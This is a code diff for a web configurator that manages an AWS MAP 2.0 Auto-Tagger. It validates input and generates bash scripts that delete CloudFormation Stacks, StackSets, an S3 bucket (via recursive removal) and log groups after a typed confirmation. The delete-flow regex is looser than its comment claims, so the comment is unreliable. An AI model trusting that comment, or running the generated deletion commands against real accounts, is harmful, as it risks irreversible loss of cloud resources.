+            document.getElementById('edit-flow').classList.toggle('hidden', mode !== 'edit');
+            document.getElementById('update-flow').classList.toggle('hidden', mode !== 'update');
+            document.getElementById('delete-flow').classList.toggle('hidden', mode !== 'delete');
+            if (mode === 'edit') editorSetStep(1);
+            if (mode === 'update') updateSetStep(1);
+            if (mode === 'delete') deleteSetStep(1);
+            window.scrollTo(0, 0);
+        }
+
+        // --- Editor step navigation ---
+        function editorSetStep(num) {
+            ['estep1', 'estep2', 'estep3'].forEach((id, i) => {
+                document.getElementById(id).classList.toggle('hidden', i + 1 !== num);
+                const ind = document.getElementById(id + '-indicator');
+                ind.classList.remove('active', 'done');
+                if (i + 1 < num) ind.classList.add('done');
+                if (i + 1 === num) ind.classList.add('active');
+            });
+            window.scrollTo(0, 0);
+        }
+
+        // --- Update step navigation ---
+        function updateSetStep(num) {
+            ['ustep1', 'ustep2', 'ustep3'].forEach((id, i) => {
+                document.getElementById(id).classList.toggle('hidden', i + 1 !== num);
+                const ind = document.getElementById(id + '-indicator');
+                ind.classList.remove('active', 'done');
+                if (i + 1 < num) ind.classList.add('done');
+                if (i + 1 === num) ind.classList.add('active');
+            });
+            if (num === 1) {
+                const host = document.getElementById('update-versionHistoryContent');
+                if (host) host.innerHTML = renderVersionHistory();
+            }
+            window.scrollTo(0, 0);
+        }
+
+        function editorReview() {
+            // Validate step 1 first
+            const mpeRaw = document.getElementById('editor-mpeId').value.trim();
+            const region = document.getElementById('editor-region').value;
+            const actionEl = document.querySelector('input[name="editor-action"]:checked');
+            const actionVal = actionEl ? actionEl.value : null;
+            const listId = actionVal === 'remove' ? 'editor-remove-accountList' : 'editor-add-accountList';
+            const errorId = actionVal === 'remove' ? 'editor-remove-account-error' : 'editor-account-error';
+            const allInputs = [...document.getElementById(listId).querySelectorAll('.editor-account-input')];
+            const accounts = allInputs.map(el => el.value.trim()).filter(v => /^\d{12}$/.test(v));
+            const hasInvalid = allInputs.some(el => el.value.trim() && !/^\d{12}$/.test(el.value.trim()));
+
+            let valid = true;
+
+            if (!/^(?=.*[A-Z])(?=.*[0-9])[A-Z0-9]{10}$/.test(mpeRaw)) {
+                document.getElementById('editor-mpeId').classList.add('error');
+                document.getElementById('editor-mpeId-error').style.display = 'block';
+                valid = false;
+            } else {
+                document.getElementById('editor-mpeId').classList.remove('error');
+                document.getElementById('editor-mpeId-error').style.display = 'none';
+            }
+
+            if (!region) {
+                document.getElementById('editor-region').classList.add('error');
+                document.getElementById('editor-region-error').style.display = 'block';
+                valid = false;
+            } else {
+                document.getElementById('editor-region').classList.remove('error');
+                document.getElementById('editor-region-error').style.display = 'none';
+            }
+
+            if (!actionVal) {
+                document.getElementById('editor-opt-add').style.outline = '2px solid #d13212';
+                document.getElementById('editor-opt-remove').style.outline = '2px solid #d13212';
+                valid = false;
+            } else {
+                document.getElementById('editor-opt-add').style.outline = '';
+                document.getElementById('editor-opt-remove').style.outline = '';
+            }
+
+            allInputs.forEach(el => {
+                const bad = el.value.trim() && !/^\d{12}$/.test(el.value.trim());
+                el.classList.toggle('error', bad);
+                el.title = bad ? t('err_account_format') : '';
+            });
+            if (accounts.length === 0 || hasInvalid) {
+                document.getElementById(errorId).style.display = 'block';
+                const errKey = hasInvalid ? 'err_account_format' : 'err_editor_account';
+                document.getElementById(errorId).setAttribute('data-i18n', errKey);
+                document.getElementById(errorId).textContent = t(errKey);
+                valid = false;
+            } else {
+                document.getElementById(errorId).style.display = 'none';
+            }
+
+            if (!valid) return;
+
+            // Build review table
+            const mpe = 'mig' + mpeRaw;
+            const action = actionVal || '';
+            const backfill = document.getElementById('editor-includeBackfill').checked && action === 'add';
+            const table = document.getElementById('editor-reviewTable');
+            const rows = [
+                [t('ui_mpe_tag'), mpe],
+                [t('ui_editor_region'), region],
+                [t('ui_editor_action_title'), action === 'add' ? t('ui_editor_add_title') : t('ui_editor_remove_title')],
+                [t('ui_editor_review_accounts'), accounts.join(', ')],
+            ];
+            if (action === 'add') rows.push([t('ui_backfill_title'), backfill ? t('rv_backfill_enabled') : t('rv_disabled')]);
+            // Safe DOM construction: v may contain user-controlled values
+            // (customer name, account IDs) so use textContent rather than
+            // innerHTML template-literal interpolation. (§1.94, 21.0.6)
+            table.replaceChildren();
+            rows.forEach(([k, v], i) => {
+                const tr = document.createElement('tr');
+                tr.style.borderBottom = '1px solid #eaeded';
+                if (i % 2 === 0) tr.style.background = '#fafafa';
+                const td1 = document.createElement('td');
+                td1.style.padding = '8px';
+                td1.style.fontWeight = '600';
+                td1.style.width = '40%';
+                td1.style.color = '#687078';
+                td1.textContent = k;
+                const td2 = document.createElement('td');
+                td2.style.padding = '8px';
+                td2.textContent = v;
+                tr.append(td1, td2);
+                table.appendChild(tr);
+            });
+
+            // Reset confirm checkbox
+            document.getElementById('editor-confirm').checked = false;
+            document.getElementById('editor-confirm-error').style.display = 'none';
+
+            editorSetStep(2);
+        }
+
+        // --- Editor functions ---
+        function editorSelectAction(action) {
+            document.querySelector(`input[name="editor-action"][value="${action}"]`).checked = true;
+            document.getElementById('editor-opt-add').classList.toggle('selected', action === 'add');
+            document.getElementById('editor-opt-remove').classList.toggle('selected', action === 'remove');
+            document.getElementById('editor-opt-add').style.outline = '';
+            document.getElementById('editor-opt-remove').style.outline = '';
+            document.getElementById('editor-add-accounts-section').classList.toggle('hidden', action !== 'add');
+            document.getElementById('editor-remove-accounts-section').classList.toggle('hidden', action !== 'remove');
+        }
+
+        // --- Update flow handlers ---
+        function updateToggleScope() {
+            const checked = document.getElementById('update-scopeToMpe').checked;
+            document.getElementById('update-mpeSection').classList.toggle('hidden', !checked);
+        }
+
+        function updateAddMpe() {
+            const list = document.getElementById('update-mpeList');
+            const row = document.createElement('div');
+            row.className = 'entry-row';
+            row.style.cssText = 'display:flex;align-items:center;gap:8px;';
+            row.innerHTML =
+                '<div style="display:flex;align-items:center;gap:0;flex:1;">' +
+                    '<span style="padding:8px 10px;background:#f2f3f3;border:1px solid #aab7b8;border-right:none;border-radius:4px 0 0 4px;font-size:14px;color:#687078;white-space:nowrap;">mig</span>' +
+                    '<input type="text" class="update-mpe-input" placeholder="A1B2C3D4E5" maxlength="10" style="border-radius:0 4px 4px 0;" oninput="this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,\'\')">' +
+                '</div>' +
+                '<button class="btn-remove" onclick="editorRemoveRow(this)" title="Remove">&times;</button>';
+            list.appendChild(row);
+        }
+
+        function updateReview() {
+            const region = document.getElementById('update-region').value;
+            const scopeToMpe = document.getElementById('update-scopeToMpe').checked;
+            const mpeInputs = [...document.getElementById('update-mpeList').querySelectorAll('.update-mpe-input')];
+            const mpeRegex = /^(?=.*[A-Z])(?=.*[0-9])[A-Z0-9]{10}$/;
+            const selectedMpes = scopeToMpe
+                ? mpeInputs.map(el => el.value.trim()).filter(v => mpeRegex.test(v))
+                : [];
+
+            let valid = true;
+
+            if (!region) {
+                document.getElementById('update-region').classList.add('error');
+                document.getElementById('update-region-error').style.display = 'block';
+                valid = false;
+            } else {
+                document.getElementById('update-region').classList.remove('error');
+                document.getElementById('update-region-error').style.display = 'none';
+            }
+
+            if (scopeToMpe) {
+                const hasInvalid = mpeInputs.some(el => el.value.trim() && !mpeRegex.test(el.value.trim()));
+                mpeInputs.forEach(el => {
+                    const bad = el.value.trim() && !mpeRegex.test(el.value.trim());
+                    el.classList.toggle('error', bad);
+                });
+                if (selectedMpes.length === 0 || hasInvalid) {
+                    document.getElementById('update-mpe-error').style.display = 'block';
+                    valid = false;
+                } else {
+                    document.getElementById('update-mpe-error').style.display = 'none';
+                }
+            } else {
+                document.getElementById('update-mpe-error').style.display = 'none';
+            }
+
+            if (!valid) return;
+
+            // Build review table
+            const table = document.getElementById('update-reviewTable');
+            const rows = [
+                [t('ui_editor_region'), region],
+                [t('ui_update_scope_review'),
+                    selectedMpes.length > 0
+                        ? selectedMpes.map(m => 'mig' + m).join(', ')
+                        : t('ui_update_all_review')],
+                [t('ui_update_target_version'), TEMPLATE_VERSION],
+            ];
+            // Safe DOM construction: v may contain user-controlled values
+            // (MPE IDs) so use textContent rather than innerHTML template-
+            // literal interpolation. (§1.94, 21.0.6)
+            table.replaceChildren();
+            rows.forEach(([k, v], i) => {
+                const tr = document.createElement('tr');
+                tr.style.borderBottom = '1px solid #eaeded';
+                if (i % 2 === 0) tr.style.background = '#fafafa';
+                const td1 = document.createElement('td');
+                td1.style.padding = '8px';
+                td1.style.fontWeight = '600';
+                td1.style.width = '40%';
+                td1.style.color = '#687078';
+                td1.textContent = k;
+                const td2 = document.createElement('td');
+                td2.style.padding = '8px';
+                td2.textContent = v;
+                tr.append(td1, td2);
+                table.appendChild(tr);
+            });
+
+            document.getElementById('update-confirm').checked = false;
+            document.getElementById('update-confirm-error').style.display = 'none';
+
+            updateSetStep(2);
+        }
+
+        function updateGenerate() {
+            if (!document.getElementById('update-confirm').checked) {
+                document.getElementById('update-confirm-error').style.display = 'block';
+                return;
+            }
+            document.getElementById('update-confirm-error').style.display = 'none';
+
+            const region = document.getElementById('update-region').value;
+            editorGenerateUpgrade(region);
+        }
+
+        function updateDownload() {
+            const blob = new Blob([window._upgradeScript], { type: 'text/x-sh' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = `upgrade-${window._upgradeMpe}.sh`;
+            a.click();
+        }
+
+        function updateCopyInstructions() {
+            navigator.clipboard.writeText(document.getElementById('update-instructions').textContent).then(() => {
+                const btn = document.querySelector('[onclick="updateCopyInstructions()"]');
+                const orig = btn.textContent;
+                btn.textContent = '✓ Copied';
+                setTimeout(() => { btn.textContent = orig; }, 1500);
+            });
+        }
+
+        // --- Delete flow ---
+        // Mirror the Editor/Update MPE regex: 10 chars, uppercase A–Z + 0–9, at least one
+        // letter and one digit. Stricter than the Lambda AllowedPattern on purpose — the
+        // configurator enforces the MAP Engagement ID format at the UI boundary so all
+        // three flows (Editor, Update, Delete) behave identically.
+        const DELETE_MPE_REGEX = /^[A-Z0-9]+$/;
+
+        function deleteSetStep(num) {
+            ['dstep1', 'dstep2', 'dstep3'].forEach((id, i) => {
+                document.getElementById(id).classList.toggle('hidden', i + 1 !== num);
+                const ind = document.getElementById(id + '-indicator');
+                ind.classList.remove('active', 'done');
+                if (i + 1 < num) ind.classList.add('done');
+                if (i + 1 === num) ind.classList.add('active');
+            });
+            window.scrollTo(0, 0);
+        }
+
+        function deleteToggleScope() {
+            const enabled = document.getElementById('delete-scopeToMpe').checked;
+            document.getElementById('delete-mpeSection').classList.toggle('hidden', !enabled);
+        }
+
+        function deleteAddMpe() {
+            const list = document.getElementById('delete-mpeList');
+            const row = document.createElement('div');
+            row.className = 'entry-row';
+            row.style.cssText = 'display:flex;align-items:center;gap:8px;';
+            row.innerHTML = '<div style="display:flex;align-items:center;gap:0;flex:1;"><span style="padding:8px 10px;background:#f2f3f3;border:1px solid #aab7b8;border-right:none;border-radius:4px 0 0 4px;font-size:14px;color:#687078;white-space:nowrap;">mig</span><input type="text" class="delete-mpe-input" placeholder="A1B2C3D4E5" maxlength="10" style="border-radius:0 4px 4px 0;" oninput="this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,\'\')"></div><button class="btn-remove" onclick="editorRemoveRow(this)" title="Remove">&times;</button>';
+            list.appendChild(row);
+        }
+
+        function deleteReview() {
+            const region = document.getElementById('delete-region').value;
+            const scopeToMpe = document.getElementById('delete-scopeToMpe').checked;
+            const deleteLogs = document.getElementById('delete-deleteLogs').checked;
+
+            let valid = true;
+            if (!region) {
+                document.getElementById('delete-region-error').style.display = 'block';
+                valid = false;
+            } else {
+                document.getElementById('delete-region-error').style.display = 'none';
+            }
+
+            let selectedMpes = [];
+            if (scopeToMpe) {
+                const inputs = [...document.getElementById('delete-mpeList').querySelectorAll('.delete-mpe-input')];
+                selectedMpes = inputs
+                    .map(el => el.value.trim())
+                    .filter(v => DELETE_MPE_REGEX.test(v))
+                    .map(v => 'mig' + v);
+                const hasInvalid = inputs.some(el => el.value.trim() && !DELETE_MPE_REGEX.test(el.value.trim()));
+                inputs.forEach(el => {
+                    const bad = el.value.trim() && !DELETE_MPE_REGEX.test(el.value.trim());
+                    el.classList.toggle('error', bad);
+                });
+                if (selectedMpes.length === 0 || hasInvalid) {
+                    document.getElementById('delete-mpe-error').style.display = 'block';
+                    valid = false;
+                } else {
+                    document.getElementById('delete-mpe-error').style.display = 'none';
+                }
+            } else {
+                document.getElementById('delete-mpe-error').style.display = 'none';
+            }
+            if (!valid) return;
+
+            window._deleteReview = { region, scopeToMpe, deleteLogs, selectedMpes };
+            deleteRenderReview(window._deleteReview);
+
+            document.getElementById('delete-confirmInput').value = '';
+            document.getElementById('delete-confirm-error').style.display = 'none';
+            deleteSetStep(2);
+        }
+
+        function deleteRenderReview(cfg) {
+            const yes = t('rv_yes');
+            const no = t('rv_no');
+            const scopeLabel = cfg.scopeToMpe
+                ? t('ui_delete_scope_specific') + ': ' + cfg.selectedMpes.join(', ')
+                : t('ui_delete_scope_all');
+            const bucketLabel = cfg.scopeToMpe
+                ? t('ui_delete_bucket_conditional')
+                : t('ui_delete_bucket_yes');
+
+            const rows = [
+                [t('ui_editor_region'), cfg.region],
+                [t('ui_delete_scope_title'), scopeLabel],
+                [t('ui_delete_optin_bucket'), bucketLabel],
+                [t('ui_delete_optin_logs'), cfg.deleteLogs ? yes : no],
+            ];
+            // Safe DOM construction: v may contain user-controlled values
+            // (MPE IDs, region strings) so use textContent rather than
+            // innerHTML template-literal interpolation. Preserves the
+            // delete-review styles (padding 10px 12px, v-cell font-weight
+            // 600). (§1.94, 21.0.6)
+            const deleteTable = document.getElementById('delete-reviewTable');
+            deleteTable.replaceChildren();
+            rows.forEach(([k, v], i) => {
+                const tr = document.createElement('tr');
+                tr.style.borderBottom = '1px solid #eaeded';
+                if (i % 2 === 0) tr.style.background = '#fafafa';
+                const td1 = document.createElement('td');
+                td1.style.padding = '10px 12px';
+                td1.style.width = '40%';
+                td1.style.color = '#687078';
+                td1.textContent = k;
+                const td2 = document.createElement('td');
+                td2.style.padding = '10px 12px';
+                td2.style.fontWeight = '600';
+                td2.textContent = v;
+                tr.append(td1, td2);
+                deleteTable.appendChild(tr);
+            });
+        }
+
+        function deleteGenerate() {
+            const typed = document.getElementById('delete-confirmInput').value.trim();
+            if (typed !== 'DELETE') {
+                document.getElementById('delete-confirm-error').style.display = 'block';
+                return;
+            }
+            document.getElementById('delete-confirm-error').style.display = 'none';
+
+            const region = document.getElementById('delete-region').value;
+            const scopeToMpe = document.getElementById('delete-scopeToMpe').checked;
+            const deleteLogs = document.getElementById('delete-deleteLogs').checked;
+            const mpeInputs = [...document.getElementById('delete-mpeList').querySelectorAll('.delete-mpe-input')];
+            const selectedMpes = scopeToMpe
+                ? mpeInputs
+                    .map(el => el.value.trim())
+                    .filter(v => DELETE_MPE_REGEX.test(v))
+                    .map(v => 'mig' + v)
+                : [];
+
+            const mpeListShell = selectedMpes.length > 0 ? selectedMpes.map(m => `"${m}"`).join(' ') : '';
+            const scopeNote = selectedMpes.length > 0
+                ? `specific MPE(s): ${selectedMpes.join(', ')}`
+                : 'all MAP Auto-Tagger deployments in this region';
+
+            const script = `#!/bin/bash
+# MAP 2.0 Auto-Tagger — Delete Script
+# Scope: ${scopeNote}
+# Region: ${region}
+# Template version: ${TEMPLATE_VERSION}
+#
+# Deletes:
+#   - All matching Stack(s) and StackSet(s) in the region
+#   - S3 staging bucket — only when no map-auto-tagger-mig* deployments remain
+${deleteLogs ? '#   - CloudWatch Log Groups for deleted deployments\n' : ''}#
+# Preserves:
+#   - map-migrated tags on already-tagged AWS resources (credits stay intact)
+#   - StackSet admin/execution IAM roles (shared org scaffolding — never deleted)
+${deleteLogs ? '' : '#   - CloudWatch Log Groups (audit history)\n'}set -e
+
+REGION="${region}"
+SCOPE_MPES=(${mpeListShell})
+DELETE_LOGS=${deleteLogs ? 'true' : 'false'}
+
+echo ""
+echo "  ┌──────────────────────────────────────────────────────┐"
+echo "  │   MAP 2.0 Auto-Tagger — Delete                        │"
+echo "  │   Region: $REGION"
+echo "  │   Scope: ${selectedMpes.length > 0 ? 'specific MPE(s) — ' + selectedMpes.join(', ') : 'ALL map-auto-tagger-mig* in region'}"
+echo "  └──────────────────────────────────────────────────────┘"
+echo ""
+
+ACCOUNT=\$(aws sts get-caller-identity --query Account --output text)
+DELETED=0
+SKIPPED=0
+FAILED=0
+
+# ── Step 1: Enumerate deployments ────────────────────────────
+echo "Step 1: Locating deployments..."
+STACKSETS=()
+STACKS=()
+
+if [ \${#SCOPE_MPES[@]} -gt 0 ]; then
+    for MPE in "\${SCOPE_MPES[@]}"; do
+        if aws cloudformation describe-stack-set --region "\$REGION" --stack-set-name "map-auto-tagger-\${MPE}" > /dev/null 2>&1; then
+            STACKSETS+=("map-auto-tagger-\${MPE}")
+        elif aws cloudformation describe-stacks --region "\$REGION" --stack-name "map-auto-tagger-\${MPE}" > /dev/null 2>&1; then
+            STACKS+=("map-auto-tagger-\${MPE}")
+        else
+            echo "  ⚠️  MPE '\${MPE}' — no Stack or StackSet found. Skipping."
+            SKIPPED=\$((SKIPPED + 1))
+        fi
+    done
+else
+    while IFS= read -r NAME; do
+        [ -n "\$NAME" ] && STACKSETS+=("\$NAME")
+    done < <(aws cloudformation list-stack-sets --region "\$REGION" --status ACTIVE --query "Summaries[?starts_with(StackSetName, 'map-auto-tagger-mig')].StackSetName" --output text | tr '\\t' '\\n')
+    while IFS= read -r NAME; do
+        [ -n "\$NAME" ] && STACKS+=("\$NAME")
+    done < <(aws cloudformation list-stacks --region "\$REGION" --stack-status-filter CREATE_COMPLETE UPDATE_COMPLETE UPDATE_ROLLBACK_COMPLETE --query "StackSummaries[?starts_with(StackName, 'map-auto-tagger-mig')].StackName" --output text | tr '\\t' '\\n')
+fi
+
+TOTAL=\$((\${#STACKSETS[@]} + \${#STACKS[@]}))
+if [ \$TOTAL -eq 0 ]; then
+    echo "  ⚠️  No MAP Auto-Tagger deployments found matching criteria."
+    # Check for legacy pre-namespacing stack (same pattern as upgrade.sh).
+    if aws cloudformation describe-stacks --region "\$REGION" --stack-name "map-auto-tagger" > /dev/null 2>&1; then
+        echo ""
+        echo "  Found legacy unnamespaced stack 'map-auto-tagger' in this region."
+        echo "  This script targets namespaced (map-auto-tagger-mig*) deployments only."
+        echo "  To remove the legacy stack manually:"
+        echo "    aws cloudformation delete-stack --stack-name map-auto-tagger --region \$REGION"
+        echo "    aws cloudformation wait stack-delete-complete --stack-name map-auto-tagger --region \$REGION"
+    fi
+    exit 0
+fi
+echo "  Found \${#STACKSETS[@]} StackSet(s) and \${#STACKS[@]} Stack(s) — \$TOTAL total."
+for SS in "\${STACKSETS[@]}"; do echo "    • StackSet \$SS"; done
+for ST in "\${STACKS[@]}"; do echo "    • Stack    \$ST"; done
+echo ""
+
+# ── Helper: delete one deployment ───────────────────────────
+delete_one() {
+    local KIND="\$1" NAME="\$2"
+    echo "── \$KIND: \$NAME ──────────────────────────────"
+
+    if [ "\$KIND" = "stackset" ]; then
+        local INSTANCES
+        INSTANCES=\$(aws cloudformation list-stack-instances --region "\$REGION" --stack-set-name "\$NAME" --query "Summaries[].[Account,Region]" --output text 2>/dev/null)
+        if [ -n "\$INSTANCES" ]; then
+            local REGIONS PERM_MODEL
+            REGIONS=\$(echo "\$INSTANCES" | awk '{print \$2}' | sort -u | tr '\\n' ' ')
+            PERM_MODEL=\$(aws cloudformation describe-stack-set --region "\$REGION" --stack-set-name "\$NAME" --query "StackSet.PermissionModel" --output text 2>/dev/null)
+            local DELETE_TARGETS
+            if [ "\$PERM_MODEL" = "SERVICE_MANAGED" ]; then
+                local ROOT_OU
+                ROOT_OU=\$(aws organizations list-roots --query "Roots[0].Id" --output text 2>/dev/null)
+                echo "  SERVICE_MANAGED StackSet — targeting root OU \$ROOT_OU..."
+                DELETE_TARGETS="--deployment-targets OrganizationalUnitIds=\$ROOT_OU"
+            else
+                local ACCOUNTS
+                ACCOUNTS=\$(echo "\$INSTANCES" | awk '{print \$1}' | sort -u | tr '\\n' ' ')
+                echo "  Deleting stack instances (\$(echo \$ACCOUNTS | wc -w) account(s))..."
+                DELETE_TARGETS="--accounts \$ACCOUNTS"
+            fi
+            local OP_ID
+            OP_ID=\$(aws cloudformation delete-stack-instances --region "\$REGION" --stack-set-name "\$NAME" \$DELETE_TARGETS --regions \$REGIONS --no-retain-stacks --operation-preferences "MaxConcurrentPercentage=100,FailureTolerancePercentage=100,RegionConcurrencyType=PARALLEL" --query OperationId --output text 2>&1) || { echo "  ❌ \$OP_ID"; return 1; }
+            local WAIT=0
+            while [ \$WAIT -lt 1800 ]; do
+                local STATUS
+                STATUS=\$(aws cloudformation describe-stack-set-operation --region "\$REGION" --stack-set-name "\$NAME" --operation-id "\$OP_ID" --query "StackSetOperation.Status" --output text 2>/dev/null)
+                if [ "\$STATUS" = "SUCCEEDED" ]; then echo "  ✅ Instances deleted."; break
+                elif [ "\$STATUS" = "FAILED" ] || [ "\$STATUS" = "STOPPED" ]; then
+                    echo "  ❌ \$STATUS. Investigate: aws cloudformation describe-stack-set-operation --stack-set-name \$NAME --operation-id \$OP_ID --region \$REGION"
+                    return 1
+                fi
+                sleep 30; WAIT=\$((WAIT + 30)); echo "  Still deleting... (\${WAIT}s)"
+            done
+        fi
+        aws cloudformation delete-stack-set --region "\$REGION" --stack-set-name "\$NAME" && echo "  ✅ StackSet deleted." || { echo "  ❌ delete-stack-set failed."; return 1; }
+    else
+        aws cloudformation delete-stack --region "\$REGION" --stack-name "\$NAME"
+        echo "  Waiting for deletion..."
+        if aws cloudformation wait stack-delete-complete --region "\$REGION" --stack-name "\$NAME"; then
+            echo "  ✅ Stack deleted."
+        else
+            echo "  ❌ Deletion failed. Investigate: aws cloudformation describe-stack-events --stack-name \$NAME --region \$REGION"
+            return 1
+        fi
+    fi
+    echo ""
+    return 0
+}
+
+# ── Step 2: Delete all matching deployments ─────────────────
+echo "Step 2: Deleting \${#STACKSETS[@]} StackSet(s) and \${#STACKS[@]} Stack(s)..."
+echo ""
+for NAME in "\${STACKSETS[@]}"; do
+    if delete_one "stackset" "\$NAME"; then DELETED=\$((DELETED + 1)); else FAILED=\$((FAILED + 1)); fi
+done
+for NAME in "\${STACKS[@]}"; do
+    if delete_one "stack" "\$NAME"; then DELETED=\$((DELETED + 1)); else FAILED=\$((FAILED + 1)); fi
+done
+
+# ── Step 3: S3 staging bucket (auto-decide) ─────────────────
+echo "Step 3: Checking S3 staging bucket..."
+BUCKET="auto-map-tagger-\${ACCOUNT}"
+if ! aws s3api head-bucket --bucket "\$BUCKET" 2>/dev/null; then
+    echo "  Bucket \$BUCKET not found — nothing to delete."
+else
+    REMAINING_SS=\$(aws cloudformation list-stack-sets --region "\$REGION" --status ACTIVE --query "Summaries[?starts_with(StackSetName, 'map-auto-tagger-mig')].StackSetName" --output text 2>/dev/null)
+    REMAINING_ST=\$(aws cloudformation list-stacks --region "\$REGION" --stack-status-filter CREATE_COMPLETE UPDATE_COMPLETE UPDATE_ROLLBACK_COMPLETE --query "StackSummaries[?starts_with(StackName, 'map-auto-tagger-mig')].StackName" --output text 2>/dev/null)
+    if [ -n "\$REMAINING_SS" ] || [ -n "\$REMAINING_ST" ]; then
+        echo "  Other MAP Auto-Tagger deployments still use this bucket:"
+        [ -n "\$REMAINING_SS" ] && echo "    StackSets: \$REMAINING_SS"
+        [ -n "\$REMAINING_ST" ] && echo "    Stacks:    \$REMAINING_ST"
+        echo "  Bucket \$BUCKET retained."
+    else
+        echo "  No MAP Auto-Tagger deployments remain. Emptying and deleting bucket..."
+        aws s3 rm "s3://\$BUCKET" --recursive > /dev/null 2>&1 || true
+        if aws s3api delete-bucket --bucket "\$BUCKET" --region "\$REGION" 2>/dev/null || aws s3api delete-bucket --bucket "\$BUCKET" 2>/dev/null; then
+            echo "  ✅ Bucket deleted."
+            DELETED=\$((DELETED + 1))
+        else
+            echo "  ❌ Bucket deletion failed (may contain versioned objects)."
+            FAILED=\$((FAILED + 1))
+        fi
+    fi
+fi
+echo ""
+
+# ── Step 4: Optional — CloudWatch Log Groups ────────────────
+if [ "\$DELETE_LOGS" = "true" ]; then
+    echo "Step 4: Deleting CloudWatch Log Groups..."
+    if [ \${#SCOPE_MPES[@]} -gt 0 ]; then
+        for MPE in "\${SCOPE_MPES[@]}"; do
+            LOG_GROUPS=\$(aws logs describe-log-groups --region "\$REGION" --log-group-name-prefix "/aws/lambda/map-auto-tagger" --query "logGroups[?ends_with(logGroupName, '-\${MPE}')].logGroupName" --output text 2>/dev/null)
+            for LG in \$LOG_GROUPS; do
+                aws logs delete-log-group --region "\$REGION" --log-group-name "\$LG" 2>/dev/null && { echo "  ✅ Deleted \$LG"; DELETED=\$((DELETED + 1)); } || { echo "  ❌ Failed: \$LG"; FAILED=\$((FAILED + 1)); }
+            done
+        done
+    else
+        LOG_GROUPS=\$(aws logs describe-log-groups --region "\$REGION" --log-group-name-prefix "/aws/lambda/map-auto-tagger" --query "logGroups[].logGroupName" --output text 2>/dev/null)
+        for LG in \$LOG_GROUPS; do
+            aws logs delete-log-group --region "\$REGION" --log-group-name "\$LG" 2>/dev/null && { echo "  ✅ Deleted \$LG"; DELETED=\$((DELETED + 1)); } || { echo "  ❌ Failed: \$LG"; FAILED=\$((FAILED + 1)); }
+        done
+    fi
+    echo ""
+fi
+
+# ── Summary ─────────────────────────────────────────────────
+echo "  ┌──────────────────────────────────────────────────────┐"
+if [ \$FAILED -gt 0 ]; then
+    echo "  │   ⚠️  Delete completed with failures                  │"
+    echo "  │   Deleted: \$DELETED  Skipped: \$SKIPPED  Failed: \$FAILED"
+    echo "  └──────────────────────────────────────────────────────┘"
+    echo ""
+    echo "  Preserved: map-migrated tags, StackSet admin IAM roles"
+    exit 1
+else
+    echo "  │   ✅ Delete complete                                  │"
+    echo "  │   Deleted: \$DELETED  Skipped: \$SKIPPED"
+    echo "  └──────────────────────────────────────────────────────┘"
+    echo ""
+    echo "  Preserved: map-migrated tags on AWS resources, StackSet admin IAM roles"
+    [ "\$DELETE_LOGS" != "true" ] && echo "             CloudWatch Log Groups (audit history)"
+fi
+`;
+
+            document.getElementById('delete-scriptContent').textContent = script;
+            window._deleteScript = script;
+            window._deleteLabel = selectedMpes.length > 0 ? selectedMpes.join('-') : 'all';
+
+            document.getElementById('delete-instructions').textContent = deleteBuildInstructions(window._deleteReview);
+            deleteSetStep(3);
+        }
+
+        function deleteBuildInstructions(cfg) {
+            const scopeLine = cfg.selectedMpes.length > 0
+                ? t('d_instr_scope_specific') + ' ' + cfg.selectedMpes.join(', ')
+                : t('d_instr_scope_all');
+            const whatDoesLine = cfg.selectedMpes.length > 0
+                ? '  - ' + t('d_instr_what_scoped') + '\n'
+                : '  - ' + t('d_instr_what_all') + '\n';
+            const logsLine = cfg.deleteLogs ? '  - ' + t('d_instr_logs_delete') + '\n' : '';
+            const logsPreserved = cfg.deleteLogs ? '' : '  - ' + t('d_instr_logs_preserve') + '\n';
+            return `${t('d_instr_title')}
+=========================================
+
+${t('d_instr_region_label')} ${cfg.region}
+${t('d_instr_scope_label')} ${scopeLine}
+${t('d_instr_version_label')} ${TEMPLATE_VERSION}
+
+── ${t('d_instr_opt1')} ──────────────────
+${t('d_instr_opt1_step1')}
+${t('d_instr_opt1_step2')}
+${t('d_instr_opt1_step3')}
+   bash delete.sh
+
+── ${t('d_instr_opt2')} ──────────────────
+${t('d_instr_opt2_step1')}
+${t('d_instr_opt2_step2')}
+
+─────────────────────────────────────────────────
+${t('d_instr_what_title')}
+${whatDoesLine}  - ${t('d_instr_what_stackset')}
+  - ${t('d_instr_what_stack')}
+  - ${t('d_instr_what_bucket')}
+${logsLine}
+${t('d_instr_preserved_title')}
+  - ${t('d_instr_preserved_tags')}
+  - ${t('d_instr_preserved_iam')}
+${logsPreserved}
+${t('d_instr_idempotent')}`;
+        }
+
+        function deleteDownload() {
+            const blob = new Blob([window._deleteScript], { type: 'text/x-sh' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = `delete-${window._deleteLabel}.sh`;
+            a.click();
+        }
+
+        function deleteCopyInstructions() {
+            navigator.clipboard.writeText(document.getElementById('delete-instructions').textContent).then(() => {
+                const btn = document.querySelector('[onclick="deleteCopyInstructions()"]');
+                const orig = btn.textContent;
+                btn.textContent = '✓ Copied';
+                setTimeout(() => { btn.textContent = orig; }, 1500);
+            });
+        }
+
+        function editorAddAccount(type) {
+            const listId = type === 'remove' ? 'editor-remove-accountList' : 'editor-add-accountList';
+            const list = document.getElementById(listId);
+            const row = document.createElement('div');
+            row.className = 'entry-row';
+            row.innerHTML = '<input type="text" class="editor-account-input" placeholder="123456789012" maxlength="12"><button class="btn-remove" onclick="editorRemoveRow(this)" title="Remove">&times;</button>';
+            list.appendChild(row);
+            const input = row.querySelector('input');
+            input.addEventListener('blur',  () => editorValidateAccount(input));
+            input.addEventListener('input', () => editorValidateAccount(input));
+        }
+
+        function editorValidateAccount(input) {
+            const val = input.value.trim();
+            const bad = val && !/^\d{12}$/.test(val);
+            input.classList.toggle('error', bad);
+            input.title = bad ? 'Account ID must be exactly 12 digits' : '';
+        }
+
+        function editorRemoveRow(btn) {
+            const list = btn.parentElement.parentElement;
+            if (list.children.length > 1) btn.parentElement.remove();
+        }
+
+        function editorGenerate() {
+            // Only confirmation needs checking here — all other fields validated in editorReview()
+            if (!document.getElementById('editor-confirm').checked) {
+                document.getElementById('editor-confirm-error').style.display = 'block';
+                return;
+            }
+            document.getElementById('editor-confirm-error').style.display = 'none';
+
+            const mpeRaw = document.getElementById('editor-mpeId').value.trim();
+            const mpe = 'mig' + mpeRaw;
